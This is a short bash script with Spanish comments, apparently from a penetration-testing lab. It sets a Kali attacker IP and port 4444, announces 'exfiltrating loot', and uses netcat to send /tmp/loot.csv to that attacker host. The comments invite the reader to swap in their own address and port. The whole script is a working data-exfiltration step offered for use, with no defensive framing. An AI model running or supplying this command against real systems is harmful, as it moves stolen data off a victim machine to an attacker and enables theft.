#!/bin/bash

KALI_IP="192.168.56.10" #Estos valores los cambiamos por los necesarios
PORT="4444" # Estos valores los cambiamos por lo que queramos

echo "[+] Exfiltrando loot..."

nc $KALI_IP $PORT < /tmp/loot.csv
